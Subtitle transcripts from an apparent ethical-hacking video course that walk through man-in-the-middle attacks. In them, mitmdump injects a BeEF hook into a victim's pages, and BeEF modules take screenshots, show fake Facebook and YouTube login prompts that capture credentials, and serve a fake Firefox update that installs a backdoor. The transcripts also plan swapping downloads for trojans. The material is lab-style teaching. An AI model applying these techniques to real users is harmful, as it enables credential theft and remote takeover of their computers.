00:08:53,750 --> 00:09:00,860
Second, we have to constantly be modifying packets manually here, which is not very easy and actually

121
00:09:00,860 --> 00:09:01,730
takes time.

122
00:09:02,460 --> 00:09:05,790
So this way is good to come up with the attack.

123
00:09:05,790 --> 00:09:11,700
And once we actually build our attack and we know what we want to do, we know exactly what we want

124
00:09:11,700 --> 00:09:15,690
to do, then we can use the method that I'm going to show you in the next lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,640 --> 00:00:01,210
Okay.

2
00:00:01,210 --> 00:00:08,110
Now, in this lecture, we're assuming that you already followed the steps that I showed you before

3
00:00:08,110 --> 00:00:09,850
to build up your attack.

4
00:00:09,850 --> 00:00:15,160
So you tested the attack using the explicit proxy against your own browser.

5
00:00:15,190 --> 00:00:16,480
The attack worked.

6
00:00:16,510 --> 00:00:19,510
Then you tested the attack with a simple code.

7
00:00:19,510 --> 00:00:20,520
The attack worked.

8
00:00:20,530 --> 00:00:25,600
Then you tested it with a man in the middle method, such as becoming the man in the middle using ARP

9
00:00:25,600 --> 00:00:26,350
spoofing.

10
00:00:26,350 --> 00:00:27,550
The attack worked.

11
00:00:27,550 --> 00:00:33,580
And then you tested it using man in the middle web by doing the attack manually with the complex code.

12
00:00:33,580 --> 00:00:35,020
And it all worked.

13
00:00:35,350 --> 00:00:43,390
In this lecture, I want to show you how to instruct Man in the middle proxy to run your attack without

14
00:00:43,390 --> 00:00:47,530
having to manually intercept and edit the packets.

15
00:00:47,530 --> 00:00:53,770
Because like I said, when you manually do that, you'll see that the target browser will get stuck

16
00:00:53,800 --> 00:00:57,160
until you actually modify the part that you want to modify.

17
00:00:57,940 --> 00:01:03,170
Also, you'll have to be doing this for every packet, which is very exhaustive.

18
00:01:03,920 --> 00:01:09,610
So we're going to use a tool that comes with man in the middle proxy.

19
00:01:09,620 --> 00:01:16,070
So if I just do LS here, you'll see that we have Man in the Middle web, which we were using in all

20
00:01:16,070 --> 00:01:17,600
of the previous lectures.

21
00:01:18,290 --> 00:01:22,190
In this lecture we're going to use Man in the middle dump.

22
00:01:22,790 --> 00:01:28,490
So it's in the same directory where we installed Man in the Middle proxy to use this tool.

23
00:01:28,490 --> 00:01:33,890
All you have to do is just do dot forward slash like we used to do with Man in the Middle web, followed

24
00:01:33,890 --> 00:01:37,160
by the name of the tool which is man in the middle dump.

25
00:01:38,310 --> 00:01:39,560
Followed by dash.

26
00:01:39,570 --> 00:01:40,920
Dash, transparent.

27
00:01:41,940 --> 00:01:46,500
So again, exactly like we did with Man in the Middle Web.

28
00:01:46,500 --> 00:01:52,440
So we're telling this proxy that I want you to run in the transparent mode, not in the explicit mode.

29
00:01:53,310 --> 00:01:57,570
And then we're going to use the replace argument.

30
00:01:57,570 --> 00:02:00,240
So we're going to do dash, dash, replace.

31
00:02:02,240 --> 00:02:10,730
This argument will use the same regex that we used here and it will automatically replace any occurrence

32
00:02:10,730 --> 00:02:13,400
of this with whatever we give it.

33
00:02:14,090 --> 00:02:18,560
So the input to this argument should follow the following pattern.

34
00:02:18,800 --> 00:02:26,540
So I'm just going to go on my text editor here and I'll just put this down and basically you have to

35
00:02:26,540 --> 00:02:34,460
put three colons and the first part you have to specify the rule or the regex that will trigger this

36
00:02:34,460 --> 00:02:37,220
code that will trigger the replace argument.

37
00:02:37,970 --> 00:02:40,340
So in our example above.

38
00:02:41,380 --> 00:02:49,480
You can see that the filter that we used was the tilde BS, which will look for data in the response

39
00:02:49,480 --> 00:02:50,110
body.

40
00:02:50,530 --> 00:02:54,910
So I'm going to copy this, go down and paste it.

41
00:02:55,530 --> 00:02:56,490
That's done.

42
00:02:56,880 --> 00:03:01,920
The next part is the specific data that you're looking for.

43
00:03:02,220 --> 00:03:08,040
So again, in our example, we were looking for the body tag in here.

44
00:03:09,060 --> 00:03:14,250
Again, I'm going to copy this, go down and paste it in the second part.

45
00:03:14,910 --> 00:03:20,160
Finally, you want to specify what do you want to replace this with?

46
00:03:20,550 --> 00:03:26,520
So it's going to look for this in the response body and then you have to tell it.

47
00:03:26,550 --> 00:03:28,500
What do you want to replace this with?

48
00:03:29,130 --> 00:03:34,710
And what we did before is we used to put this before the body tag.

49
00:03:34,980 --> 00:03:42,300
So in our example, we're going to put all of this in here, but that's actually going to replace the

50
00:03:42,300 --> 00:03:43,350
body with that.

51
00:03:43,470 --> 00:03:47,370
So we need to manually add the body tag to the end.

52
00:03:49,070 --> 00:03:54,800
So again, the input to the replace argument takes three parts.

53
00:03:54,980 --> 00:04:01,040
The first part is the filter, and this is the filter that we used when we were testing manually, which

54
00:04:01,040 --> 00:04:06,080
is the tilde, which will look for stuff in the response body.

55
00:04:06,560 --> 00:04:09,050
We used to look for the body tag.

56
00:04:10,000 --> 00:04:14,650
And we used to put this code before the body tag.

57
00:04:16,300 --> 00:04:20,520
But the replace argument doesn't inject it actually replaces.

58
00:04:20,530 --> 00:04:26,080
So whenever it's going to see a body tag now, it's going to replace it with this code.

59
00:04:26,290 --> 00:04:32,110
That's why I manually added slash body at the end so that the code does not break.

60
00:04:32,920 --> 00:04:39,610
Now, because we're going to put all of this in a command line, I'm going to enclose all of the codes

61
00:04:39,610 --> 00:04:44,110
here in quotation marks so that they don't interfere with Bash.

62
00:04:45,100 --> 00:04:48,970
So I'll put quotes here and I'm going to put quotes here.

63
00:04:50,710 --> 00:04:51,550
And that's it.

64
00:04:51,580 --> 00:04:52,270
We're ready.

65
00:04:52,300 --> 00:04:53,740
I'm going to copy this.

66
00:04:54,130 --> 00:04:55,210
Go up.

67
00:04:57,140 --> 00:05:00,860
And we're going to paste that here after the replace argument.

68
00:05:01,760 --> 00:05:02,630
And that's it.

69
00:05:02,630 --> 00:05:04,490
That's our command done.

70
00:05:05,000 --> 00:05:13,160
So I've actually run Ettercap before and I'm the man in the middle and I've also already run my IP table

71
00:05:13,160 --> 00:05:19,790
rule which will redirect anything that comes on port 80 to port 8080, which is where Man in the Middle

72
00:05:19,790 --> 00:05:20,990
web used to work.

73
00:05:21,020 --> 00:05:22,880
Now man in the middle web isn't working.

74
00:05:22,880 --> 00:05:24,650
I'm just using this to show you.

75
00:05:24,650 --> 00:05:31,730
But the same port is used for man in the middle dump, which is which is what I'm going to use now to

76
00:05:31,730 --> 00:05:33,030
run man in the middle dump.

77
00:05:33,050 --> 00:05:39,290
You just have to to type it's command followed by transparent because we want to run it in transparent

78
00:05:39,290 --> 00:05:41,780
mode, not in explicit mode.

79
00:05:42,500 --> 00:05:52,280
We are using the replace argument to replace any time we see a body tag in the response body and we

80
00:05:52,280 --> 00:05:55,190
want to replace that with the following code.

81
00:05:55,580 --> 00:06:01,170
Now, if you think of this, if you just sit down and try to build this command, it will be very hard

82
00:06:01,170 --> 00:06:02,290
for you to build it.

83
00:06:02,310 --> 00:06:08,160
That's why you'd have to go through the steps that I showed you in the previous lectures to reach this

84
00:06:08,160 --> 00:06:10,710
command and to be able to build this command.

85
00:06:11,250 --> 00:06:14,730
And keep in mind, now, man in the middle Web is not working.

86
00:06:14,730 --> 00:06:20,340
I just have this here to show you how to derive our command from what we've done so far.

87
00:06:20,640 --> 00:06:24,480
So we're only going to be using man in the middle dump right now.

88
00:06:24,510 --> 00:06:26,070
Now I'm going to hit enter.

89
00:06:28,080 --> 00:06:35,670
No man in the middle dump actually doesn't have a BS filter, so I'm just going to use s, which is

90
00:06:35,670 --> 00:06:36,480
responses.

91
00:06:36,480 --> 00:06:40,860
So BS is response body and S is just any response.

92
00:06:40,890 --> 00:06:42,510
It will still work for us.

93
00:06:42,510 --> 00:06:44,310
So I'm just going to hit enter.

94
00:06:45,530 --> 00:06:46,610
And that's it.

95
00:06:46,610 --> 00:06:50,780
As you can see now, proxy server is listening on port 8080.

96
00:06:50,810 --> 00:06:54,110
So it's the same port that man in the Middle Web used to use.

97
00:06:54,140 --> 00:06:57,800
And that's why we can use the same IP tables command.

98
00:06:58,520 --> 00:07:04,880
Now everything is working and if we go to beef, you'll see that we don't have anything online.

99
00:07:05,360 --> 00:07:06,980
Let's go to the target.

100
00:07:08,270 --> 00:07:10,370
And just go to Bing.com.

101
00:07:14,450 --> 00:07:15,590
Bing works.

102
00:07:15,620 --> 00:07:16,730
Let's go back.

103
00:07:18,020 --> 00:07:21,320
And as you can see, we have our online browser.

104
00:07:21,890 --> 00:07:23,210
Let's test it.

105
00:07:29,180 --> 00:07:33,500
We're going to just send an alert just to make sure everything is working.

106
00:07:34,670 --> 00:07:38,090
And as you can see now, our alert works.

107
00:07:38,690 --> 00:07:45,680
So this method is actually very similar to what does exactly what we did before, but we don't have

108
00:07:45,680 --> 00:07:50,430
to manually go through man in the middle Web and modify the packets one by one.

109
00:07:50,450 --> 00:07:57,560
Now, every time the user tries to load any page, our code is going to be injected in that page.

110
00:07:57,590 --> 00:08:00,830
So actually, if I just show you the source here.

111
00:08:02,100 --> 00:08:09,930
You can see I have the code, the hook code for beef injected in the web in here, automatically in

112
00:08:09,930 --> 00:08:12,630
the same place that we used to inject it manually.

113
00:08:13,200 --> 00:08:17,550
So man in the middle EF actually used to do this for us.

114
00:08:17,550 --> 00:08:23,460
So I'm not against using man in the middle life or using tools like that, but when you know what you're

115
00:08:23,460 --> 00:08:28,140
doing, you can expand this and do anything you want with it.

116
00:08:28,140 --> 00:08:33,180
So you can, for example, replace images, you can replace URLs.

117
00:08:33,180 --> 00:08:40,020
For example, whenever someone searches for something, you can replace the URLs to other websites or

118
00:08:40,020 --> 00:08:44,700
for example, you can replace the URLs that allow users to download something.

119
00:08:44,700 --> 00:08:52,770
For example, if a user goes to WinZip trying to download an executable, you can replace the A tag

120
00:08:52,770 --> 00:08:57,630
which is the tag responsible for redirecting a user to a URL.

121
00:08:57,660 --> 00:08:59,730
You can replace that with a backdoor.

122
00:08:59,820 --> 00:09:02,770
So the the possibility is are endless.

123
00:09:02,770 --> 00:09:08,740
Once you know how to run these attacks manually and then you can use man in the middle dump like I showed

124
00:09:08,740 --> 00:09:12,430
you now to get it to do everything for you automatically.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,050 --> 00:00:04,640
Now I'm going to spend this lecture on the next lecture talking about beef.

2
00:00:05,590 --> 00:00:11,290
Using beef isn't really a network hacking skill, but since I showed you how to hook people on the same

3
00:00:11,290 --> 00:00:17,650
network to beef in the previous lecture, I thought it would make sense to show you what beef can be

4
00:00:17,650 --> 00:00:18,490
used for.

5
00:00:18,850 --> 00:00:24,550
Now, these lectures are actually taken from my ethical hacking course and from my social engineering

6
00:00:24,550 --> 00:00:30,300
course where I spend more lectures talking about beef and how to use it with OS X and Linux.

7
00:00:30,310 --> 00:00:33,940
So you might see me referring to things that are not covered here.

8
00:00:33,970 --> 00:00:35,440
Don't worry about that.

9
00:00:35,470 --> 00:00:41,380
If you want to learn more about using beef and about social engineering course, then check out my social

10
00:00:41,380 --> 00:00:42,640
engineering course.

11
00:00:43,600 --> 00:00:50,500
So now that we have our browser or target hooked, we can go on the commands and start executing commands

12
00:00:50,500 --> 00:00:51,670
on that target.

13
00:00:52,030 --> 00:00:57,040
You can use the search to filter looking for a certain command if you know what you're looking for,

14
00:00:57,040 --> 00:01:03,460
or you can use the categories and look for command suitable to what you want to do on the target computer.

15
00:01:03,640 --> 00:01:06,340
Some of these commands are information gathering commands.

16
00:01:06,340 --> 00:01:08,230
Some of them are social engineering.

17
00:01:08,230 --> 00:01:11,990
Some of them will even give you full control over the target computer.

18
00:01:12,010 --> 00:01:17,080
There is a lot of commands, so I won't be able to go over all of them, but I'll be showing you some

19
00:01:17,080 --> 00:01:20,590
of the most important commands and examples of simple ones as well.

20
00:01:20,590 --> 00:01:24,550
So you know how to experiment and run the other commands.

21
00:01:25,260 --> 00:01:26,670
So we're starting.

22
00:01:26,670 --> 00:01:31,320
If you go on the browser, you'll see commands related to stuff that you can do inside the browser.

23
00:01:31,320 --> 00:01:36,390
So you can see things that will allow you to, for example, get a screenshot and you'll be able to

24
00:01:36,390 --> 00:01:43,890
try and gain and turn on the webcam and see if it works and basically open the webcam on the target.

25
00:01:43,920 --> 00:01:51,510
You can gather information and if you go here on the exploits you'll see a number of exploits that you

26
00:01:51,510 --> 00:01:52,260
can run.

27
00:01:52,260 --> 00:01:56,670
Again, depending on what's running on the target computer, you can run them.

28
00:01:57,490 --> 00:02:01,990
All you have to do is just click on the module that you want to run and click on Execute.

29
00:02:02,350 --> 00:02:08,080
Sometimes some modules need to send some options to be set up and we'll have examples of that as well.

30
00:02:08,440 --> 00:02:13,630
In the social engineering, again, there is some really cool stuff that you can do and you can show

31
00:02:13,630 --> 00:02:17,770
fake updates, fake notification bars and stuff like that.

32
00:02:18,740 --> 00:02:21,620
So let's have an example of a very simple command.

33
00:02:21,620 --> 00:02:24,830
So again, we're going to do just an alert to show an alert box.

34
00:02:26,560 --> 00:02:29,020
So I'm just using the search to filter.

35
00:02:29,230 --> 00:02:35,470
And you can see here this will just create an alert dialog and it's going to say beef alert dialog.

36
00:02:35,470 --> 00:02:37,720
You can modify this and type in anything you want.

37
00:02:37,750 --> 00:02:39,460
For example, I'm going to type in test.

38
00:02:41,090 --> 00:02:42,980
And then when you hit execute.

39
00:02:44,130 --> 00:02:49,020
Go on the target and you'll see that the target got a message saying test.

40
00:02:49,020 --> 00:02:52,200
So this has been injected into the target browser.

41
00:02:53,880 --> 00:02:57,480
Another cool thing that you can do is the raw JavaScript.

42
00:03:00,040 --> 00:03:03,800
And this will allow you to execute any JavaScript you want.

43
00:03:03,820 --> 00:03:08,650
So again, you can look for Google for a useful JavaScript code, for example, a keylogger or whatever

44
00:03:08,650 --> 00:03:09,490
you want to do.

45
00:03:09,640 --> 00:03:15,190
Or you can write your own if you know JavaScript and basically whatever you write here will be executed

46
00:03:15,190 --> 00:03:16,150
on the target.

47
00:03:16,240 --> 00:03:20,830
Again, we're only saying an alert and this is going to say beef raw JavaScript.

48
00:03:20,950 --> 00:03:22,450
I'm going to execute.

49
00:03:25,110 --> 00:03:26,250
And here we go again.

50
00:03:26,250 --> 00:03:29,070
We got a dialogue saying before raw JavaScript.

51
00:03:31,790 --> 00:03:35,000
Uh, let's see if we can get a screenshot of the target computer.

52
00:03:35,000 --> 00:03:39,680
And we're going to use a plugin called Spy Spider, I think.

53
00:03:39,680 --> 00:03:40,850
Yeah, Spider eye.

54
00:03:42,200 --> 00:03:44,090
So again, click on it.

55
00:03:44,090 --> 00:03:45,200
Hit, Execute.

56
00:03:46,460 --> 00:03:47,800
Give it a second.

57
00:03:47,810 --> 00:03:49,850
Then we're going to click on the command here.

58
00:03:51,250 --> 00:03:51,610
Um.

59
00:03:51,610 --> 00:03:53,350
Looks like this time didn't work properly.

60
00:03:53,350 --> 00:03:54,940
Let's just do it again.

61
00:04:05,160 --> 00:04:06,000
And here we go.

62
00:04:06,000 --> 00:04:10,050
As you can see, we got a screenshot of what the target person is looking at.

63
00:04:11,740 --> 00:04:14,590
Another really good plugin is a plugin.

64
00:04:14,590 --> 00:04:16,450
It's a redirect plugin.

65
00:04:18,550 --> 00:04:23,770
And it will basically allow you to redirect the browser to any web page you want.

66
00:04:23,800 --> 00:04:28,690
This could be very useful because you can use it to redirect the target person and tell them that they're

67
00:04:28,690 --> 00:04:28,950
going to.

68
00:04:28,960 --> 00:04:33,850
They need to download an update and instead of giving them an update, give them a back door, you can

69
00:04:33,850 --> 00:04:35,530
redirect them to a fake login page.

70
00:04:35,530 --> 00:04:39,100
For example, for Facebook, you can really do anything you want with this.

71
00:04:39,100 --> 00:04:44,620
So you can set the website that you want the target to be redirected to and we're going to redirect

72
00:04:44,620 --> 00:04:46,600
them to beef project in this example.

73
00:04:46,600 --> 00:04:48,490
And once you hit execute.

74
00:04:51,170 --> 00:04:53,990
As you can see here, the redirected to beef project.

75
00:04:56,420 --> 00:05:02,390
Okay, now let's have a look on a social engineering plugin that will allow us to steal usernames and

76
00:05:02,390 --> 00:05:04,910
passwords for accounts.

77
00:05:04,910 --> 00:05:11,210
So basically the way this works is it will dim the screen and it will tell the person that you got logged

78
00:05:11,210 --> 00:05:12,260
out of your session.

79
00:05:12,260 --> 00:05:16,640
So please log in to your account again so you can get authenticated.

80
00:05:16,640 --> 00:05:24,200
So this will allow us to bypass https hsts all, all the security that's used by the target account

81
00:05:24,200 --> 00:05:24,440
page.

82
00:05:24,440 --> 00:05:30,020
For example, if you're trying to get username and password for Facebook, then you'll be able to bypass

83
00:05:30,020 --> 00:05:35,420
all the security that Facebook uses because you're what you're doing is you're actually just showing

84
00:05:35,420 --> 00:05:36,710
a fake Facebook page.

85
00:05:36,710 --> 00:05:40,310
So the user will never actually get in contact with Facebook.

86
00:05:41,100 --> 00:05:42,930
So let's just click on this.

87
00:05:43,960 --> 00:05:46,450
And you'll see that you can click from here.

88
00:05:46,450 --> 00:05:49,760
You can click what account that you want to hijack.

89
00:05:49,780 --> 00:05:55,960
So let's say we're going with Facebook and you can select what the backlight will be.

90
00:05:55,960 --> 00:06:02,980
So we're just leaving that as gray and we're going to execute this and we go When we go to our target,

91
00:06:03,010 --> 00:06:06,880
you'll see that they're being told that they got logged out of their session.

92
00:06:06,880 --> 00:06:09,550
So please log in with your username and password.

93
00:06:09,550 --> 00:06:11,800
So I'm going to put my username as Zaid.

94
00:06:12,910 --> 00:06:16,210
Then I'm going to put my password as one, two, three, four, five, six.

95
00:06:17,830 --> 00:06:18,580
It enter?

96
00:06:20,260 --> 00:06:22,060
And if we go back here.

97
00:06:24,520 --> 00:06:30,010
You'll see that we got our username was Zaid and the password was one, two, three, four, five,

98
00:06:30,010 --> 00:06:30,580
six.

99
00:06:31,120 --> 00:06:33,670
So you can use this to hijack a number of accounts.

100
00:06:33,670 --> 00:06:36,520
For example, let's just have another example.

101
00:06:36,520 --> 00:06:44,170
If we go with YouTube again, you give it an execute, come back, you see the YouTube logo and you

102
00:06:44,170 --> 00:06:50,980
can try to log in, put a username, password sign in and that will be captured.

103
00:06:51,220 --> 00:06:58,870
So again, this is a really good way of gaining access to accounts because even if the user is not planning

104
00:06:58,870 --> 00:07:03,640
on logging into the account that you're trying to steal, then you'll kind of force them to enter their

105
00:07:03,640 --> 00:07:07,840
username and password to get to to be logged back in into their account.

106
00:07:07,840 --> 00:07:10,960
And then you'll be able to capture the username and the password.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,560 --> 00:00:06,560
Now, in this lecture, I want to show you a social engineering command that we can use with beef to

2
00:00:06,560 --> 00:00:09,770
display the Microsoft Clippy icon.

3
00:00:09,770 --> 00:00:15,320
And then we're going to tell the target person that their browser is out of date and they can download

4
00:00:15,320 --> 00:00:16,280
a new version.

5
00:00:16,280 --> 00:00:21,650
When they download the new version, they'll of course download a Trojan that will show them a Firefox

6
00:00:21,650 --> 00:00:26,600
installer, but at the same time it will execute my backdoor in the background.

7
00:00:27,820 --> 00:00:33,100
Now, like I said, this lecture is actually taken from my social engineering course, and I only added

8
00:00:33,100 --> 00:00:36,350
it here to show you some of the stuff that you can do with beef.

9
00:00:36,370 --> 00:00:42,070
So right now I'm going to use a Trojan that I show how to create in the social engineering course,

10
00:00:42,070 --> 00:00:47,110
and I will actually cover creating Trojans using a script later on in this course.

11
00:00:47,110 --> 00:00:53,230
But the Trojan used here is a little bit advanced, but I cover how to create that in the social engineering

12
00:00:53,230 --> 00:00:53,860
course.

13
00:00:53,890 --> 00:00:59,290
Now we covered how to do this, how to change it to a text and how to add an icon to it.

14
00:00:59,290 --> 00:01:01,120
So I'm not going to cover all of that.

15
00:01:01,120 --> 00:01:07,330
I actually have this all ready and done in a file called Firefox in here, and this is the file that

16
00:01:07,330 --> 00:01:10,450
I'm going to try to deliver to the target person.

17
00:01:12,580 --> 00:01:19,210
Now, the beef command that I'm going to use in this lecture works against all operating systems, like

18
00:01:19,210 --> 00:01:21,250
we said, because it uses JavaScript.

19
00:01:21,250 --> 00:01:28,130
So you just want to make sure that you select a backdoor that will work on your target operating system.

20
00:01:28,150 --> 00:01:29,680
My target is Windows.

21
00:01:29,680 --> 00:01:36,250
That's why I'm using the Windows XXI and that's why I'm actually using the Clippy plugin here in the

22
00:01:36,250 --> 00:01:41,140
social engineering because Microsoft people are kind of used to see this icon.

23
00:01:41,880 --> 00:01:44,820
Now configuring the plugin is very, very simple.

24
00:01:45,000 --> 00:01:49,570
First of all, it's asking you for the location where the clippy image is stored.

25
00:01:49,590 --> 00:01:53,700
Now beef already has that image, so you don't really need to download anything.

26
00:01:53,730 --> 00:01:56,350
You just want to put your IP address in here.

27
00:01:56,370 --> 00:01:59,310
So mine is 1020 14 to 13.

28
00:02:00,600 --> 00:02:04,110
Then you can set the text that's going to appear to the target person.

29
00:02:04,110 --> 00:02:10,140
So the text is already kind of set to a nice text, which is going to say Your Firefox is out of date.

30
00:02:10,170 --> 00:02:11,760
Do you want to update it?

31
00:02:12,150 --> 00:02:18,420
Then once they say yes, they're going to download an executable and you want to put the link to your

32
00:02:18,420 --> 00:02:19,770
executable here.

33
00:02:20,160 --> 00:02:24,780
So my executable is at 1020 14 to 13.

34
00:02:25,930 --> 00:02:27,640
And it's an evil files.

35
00:02:30,850 --> 00:02:32,860
And I named it Firefox.

36
00:02:35,670 --> 00:02:42,390
This is a delay until Clippy shows up and this is the message that the target person is going to see

37
00:02:42,420 --> 00:02:43,770
after they download.

38
00:02:43,770 --> 00:02:47,520
And it's just going to say thank you for updating your browser.

39
00:02:48,250 --> 00:02:49,930
So the plugin is very simple.

40
00:02:49,930 --> 00:02:51,520
It's in social engineering clip.

41
00:02:51,730 --> 00:02:59,110
We configured our configuration here, we set the IPS correctly and we set the location where our eval

42
00:02:59,110 --> 00:03:00,370
file is stored.

43
00:03:01,330 --> 00:03:03,070
I'm going to click on Execute.

44
00:03:03,960 --> 00:03:05,790
And go to the target machine.

45
00:03:06,950 --> 00:03:13,790
Now, as you can see, we see Clippy showing up in here and it's saying that my browser is out of date.

46
00:03:13,820 --> 00:03:15,500
Do I want to update it?

47
00:03:15,830 --> 00:03:17,030
I'm going to say yes.

48
00:03:17,030 --> 00:03:18,650
Please update it for me.

49
00:03:18,680 --> 00:03:21,470
We're going to get an installer for Firefox.

50
00:03:21,650 --> 00:03:23,210
We're going to save it.

51
00:03:23,930 --> 00:03:31,070
We're going to go to our downloads and we can see a file that looks exactly like Firefox.

52
00:03:31,100 --> 00:03:33,300
It has a Firefox icon.

53
00:03:33,320 --> 00:03:35,510
If we double click the file.

54
00:03:38,870 --> 00:03:44,180
Will actually get an installer for Firefox, so you can actually use this to install it.

55
00:03:44,180 --> 00:03:47,930
And if their browser is out of date, it will actually update it for them.

56
00:03:47,930 --> 00:03:54,230
So you'll actually be doing the target person a favor, but at the same time our backdoor is going to

57
00:03:54,230 --> 00:03:55,280
run in the background.

58
00:03:55,280 --> 00:04:01,160
As you can see, we get a connection back in Empire and now we can interact with this.

59
00:04:04,920 --> 00:04:07,680
And we can do sysinfo to confirm.

60
00:04:07,680 --> 00:04:12,930
And as you can see now, we managed to get full control over the target computer.

61
00:04:13,230 --> 00:04:19,550
Now, we did this using a file that looks exactly like Firefox and we covered how to make your backdoor,

62
00:04:19,560 --> 00:04:23,850
how to combine it with any other file type and change the icon and all of that.

63
00:04:23,970 --> 00:04:31,590
And we also managed to do this through a convincing way because the system itself told the person that

64
00:04:31,590 --> 00:04:36,000
there is a new update and when they installed the new update, this worked for them.

65
00:04:36,480 --> 00:04:40,650
It installed Firefox plus our backdoor at the same time.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 11: Post Connection Attacks - Writing Custom Scripts To Execute Own Attacks

1
00:00:01,030 --> 00:00:07,960
Okay, So what we learned so far is really cool because it allows us to modify responses sent to the

2
00:00:07,960 --> 00:00:15,640
user and we seen how we can use that to modify HTML code of the pages that the user requests and inject

3
00:00:15,640 --> 00:00:17,470
JavaScript code in that.

4
00:00:17,620 --> 00:00:23,470
Then we can hook the user to beef and from there we can we can run a large number of attacks.

5
00:00:24,100 --> 00:00:29,240
Now that method can be used to modify any response sent to the user.

6
00:00:29,290 --> 00:00:33,160
So it's not limited to modifying HTML code.

7
00:00:33,820 --> 00:00:38,890
Now what would be really cool is if we can modify downloads.

8
00:00:39,220 --> 00:00:46,090
So let's say a user goes willingly and tries to download a file, whether it's a PDF or a program.

9
00:00:46,330 --> 00:00:54,190
Then if you can replace that file, then we can get the user to download a Trojan, a backdoor, a keylogger,

10
00:00:54,190 --> 00:00:55,210
and so on.

11
00:00:55,210 --> 00:00:57,490
So it can be very, very useful.

12
00:00:58,000 --> 00:01:03,620
Now before we can do that, let's analyze what happens when a user downloads a file.

13
00:01:04,070 --> 00:01:09,680
So I've already run Man in the Middle web and I configured my browser to use Man in the Middle Web as

14
00:01:09,680 --> 00:01:10,550
a proxy.

15
00:01:10,910 --> 00:01:13,370
And I'm just going to go to Bing in here.

16
00:01:16,810 --> 00:01:18,580
And I'm going to search for WinZip.

17
00:01:18,580 --> 00:01:21,610
So I'm pretending to be a user looking for a program.

18
00:01:25,880 --> 00:01:27,680
I'm going to click on their link.

19
00:01:30,390 --> 00:01:32,970
And then click on the download link.

20
00:01:33,840 --> 00:01:35,910
This will tell me do I want to download it?

21
00:01:35,910 --> 00:01:38,280
I'm going to say yes, please let me download it.

22
00:01:39,980 --> 00:01:40,690
And that's it.

23
00:01:40,700 --> 00:01:47,270
Now the file is downloaded and we finished doing the process that we want to exploit.

24
00:01:47,390 --> 00:01:54,050
So let's go to Man in the Middle Web here and see what happened, what have we captured and try to analyze

25
00:01:54,050 --> 00:01:56,390
it and build an attack strategy.

26
00:01:57,230 --> 00:02:01,130
So let's assume that you want to replace X files.

27
00:02:01,220 --> 00:02:06,830
Now, like I said, the same method can be used to replace any files, but in our example the user downloaded

28
00:02:06,830 --> 00:02:07,640
an exe.

29
00:02:08,090 --> 00:02:17,330
So in the search I'm just going to type dot exe and as we can see, we can see a request, a get request

30
00:02:17,330 --> 00:02:21,740
to download a file called WinZip 21 Home dot exe.

31
00:02:22,490 --> 00:02:29,090
Clicking on this will give us more information about the request and we can see that this was a Http

32
00:02:29,090 --> 00:02:33,980
get request again from this host which is download.winzip.com.

33
00:02:34,340 --> 00:02:38,630
Then the response for this request was a 200.

34
00:02:38,630 --> 00:02:44,490
Okay, which means that it's a response that's saying that request is valid and we can actually give

35
00:02:44,490 --> 00:02:46,350
you something for that request.

36
00:02:46,530 --> 00:02:51,750
It came from an Apache server and in the body, this is the response body.

37
00:02:51,780 --> 00:02:53,970
It actually contains the file.

38
00:02:53,970 --> 00:03:01,950
So you can click on this to download the file or we can click on The View and just view it as a hex

39
00:03:01,950 --> 00:03:03,990
file because this is a binary file.

40
00:03:04,840 --> 00:03:10,960
And I'm just going to click on display anyway, this is only showing because the file is big and that's

41
00:03:10,960 --> 00:03:13,960
why it's showing a warning that you actually want to show it in here.

42
00:03:14,590 --> 00:03:19,500
And in here we have a look on the file content itself.

43
00:03:19,510 --> 00:03:28,120
So you can think of this as the HTML content because if you think of it, HTML pages are just HTML files.

44
00:03:28,120 --> 00:03:29,980
So this is an exe.

45
00:03:30,220 --> 00:03:31,810
Again, it's just a file.

46
00:03:31,930 --> 00:03:38,200
So using the same method that I showed you in the previous lecture, you can actually replace parts

47
00:03:38,200 --> 00:03:39,220
of this content.

48
00:03:39,220 --> 00:03:44,470
For example, you can replace this part and just replace it with any anything you want.

49
00:03:44,620 --> 00:03:51,400
You can also replace the whole code and just put another code in here and it will it should work.

50
00:03:52,030 --> 00:03:58,630
The only problem is, most of the time this might crash because the binary file that you're going to

51
00:03:58,630 --> 00:04:01,960
use is big and it might contain characters.

52
00:04:01,960 --> 00:04:05,780
That man in the middle proxy will not be able to handle.

53
00:04:06,290 --> 00:04:13,910
So one way of replacing this file that's been downloaded is by literally replacing the response body

54
00:04:13,910 --> 00:04:16,430
the same way that we replaced it before.

55
00:04:16,430 --> 00:04:21,800
But we have to do it using a different method, using scripts, and I'm going to talk about scripts

56
00:04:21,800 --> 00:04:22,670
in a minute.

57
00:04:23,480 --> 00:04:30,560
Another method to replace the downloaded file is to replace the whole response, not only the response

58
00:04:30,560 --> 00:04:31,160
body.

59
00:04:31,820 --> 00:04:39,860
We can do that by intercepting the request, and then instead of forwarding this response and editing

60
00:04:39,860 --> 00:04:43,670
it, we're actually going to create our own response.

61
00:04:43,670 --> 00:04:49,520
And in that response, we will put the file that we want to display to the user.

62
00:04:50,210 --> 00:04:57,710
Now, in order to achieve this, you'll have to use a script as well, because man in the middle dump

63
00:04:57,710 --> 00:05:03,680
and man in the middle proxy just don't support these features without a script.

64
00:05:04,250 --> 00:05:12,590
Now man in the middle proxy has an API and we can write scripts that rely on man in the middle proxy

65
00:05:12,590 --> 00:05:15,860
and then get them to be used with the proxy.

66
00:05:16,350 --> 00:05:21,750
Using these scripts, we'll be able to do so much more than what we can do right now.

67
00:05:21,750 --> 00:05:27,630
So right now we can already do so many things and a lot of cool stuff like we've seen using scripts,

68
00:05:27,630 --> 00:05:29,580
you'll be able to do so much more.

69
00:05:29,580 --> 00:05:32,160
You'll be able to create your own responses.

70
00:05:32,160 --> 00:05:37,890
You'll be able to modify the responses more reliably without crashing.

71
00:05:37,890 --> 00:05:42,420
You'll be able to run advanced attacks and implement your own ideas.

72
00:05:42,420 --> 00:05:46,200
You can literally create a program like SSL strip.

73
00:05:46,230 --> 00:05:48,480
You can create a DNS spoofer.

74
00:05:48,480 --> 00:05:51,270
You can do anything that you can think of, really.

75
00:05:51,990 --> 00:05:58,440
So in the next lecture, I'm going to teach you how to build a very basic script, how to use it with

76
00:05:58,440 --> 00:05:59,940
man in the Middle proxy.

77
00:05:59,940 --> 00:06:06,690
